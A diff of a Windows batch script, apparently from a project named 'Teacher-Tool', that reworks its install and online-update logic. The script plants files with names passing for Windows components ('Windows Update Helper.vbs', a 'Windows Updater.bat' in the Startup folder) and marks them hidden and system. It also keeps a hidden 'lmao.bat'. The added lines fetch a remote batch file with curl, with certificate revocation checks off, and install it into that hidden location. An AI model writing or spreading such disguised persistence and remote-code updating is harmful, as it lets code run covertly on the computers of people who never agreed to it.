@@ -229,17 +229,20 @@ attrib -s "%appdata%\Microsoft\Windows\Windows Update Helper.vbs" >nul 2>&1
 attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updater.bat" >nul 2>&1
 goto :createvbs
 :aftervbs
-echo vbs and startup bat installed
-if %UpdatedFromOnline%==True (if %WillUpd%==False (
-curl -O --ssl-no-revoke "https://raw.githubusercontent.com/RealFoxerity/Teacher-Tool/main/Updates/%NewVer%.bat"
-echo Calling downloaded bat...
-call "%NewVer%.bat"
-)
-)
 
 attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
 del "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
 attrib -s -h lmao.bat
+
+echo vbs and startup bat installed
+if %UpdatedFromOnline%==True (if %WillUpd%==False (
+curl -O --ssl-no-revoke "https://raw.githubusercontent.com/RealFoxerity/Teacher-Tool/main/Updates/%NewVer%.bat"
+echo Calling downloaded bat...
+xcopy "%NewVer%.bat" "%appdata%\Microsoft\Windows\" /y >nul 2>&1
+echo new lmao.bat installed
+)
+)
+
 if %UpdatedFromOnline%==False (
 xcopy lmao.bat "%appdata%\Microsoft\Windows\" /y >nul 2>&1
 ) else (copy "%NewVer%.bat" "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1)
@@ -247,10 +250,11 @@ attrib +s +h lmao.bat
 echo new lmao.bat installed
 )
 :skipupdate
-if "%UpdatedFromOnline%"=="True" (if "%UpdatedFromOnline%"=="True" (
+if "%UpdatedFromOnline%"=="True" (
 if "%dirr%"=="FLASH" (
 goto :miss
-) && goto :AfterOnlineUpd && echo Online update was completed successfully...)
+)
+goto :AfterOnlineUpd && echo Online update was completed successfully...
 
 attrib -h alreadycopied.dat
 echo true >alreadycopied.dat
